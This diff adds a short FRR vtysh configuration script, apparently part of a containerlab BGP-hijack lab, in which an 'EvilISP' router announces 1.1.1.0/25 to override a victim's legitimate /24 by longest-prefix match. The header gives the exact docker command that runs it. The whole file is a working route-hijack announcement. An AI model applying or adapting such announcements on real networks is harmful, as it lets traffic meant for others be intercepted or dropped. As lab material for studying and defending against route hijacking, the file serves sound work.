@@ -1,0 +1,17 @@
+! =============================================================================
+! HIJACK.VTY - Enables the BGP hijack
+! =============================================================================
+! Run with: cat configs/EvilISP/hijack.vty | docker exec -i clab-bgp-hijack-EvilISP vtysh
+!
+! This script announces the 1.1.1.0/25 prefix, which is MORE SPECIFIC
+! than TorHost's legitimate /24, causing BGP to prefer this route
+! due to the "Longest Prefix Match" principle.
+! =============================================================================
+
+configure terminal
+router bgp 65100
+address-family ipv4 unicast
+network 1.1.1.0/25
+exit-address-family
+exit
+exit
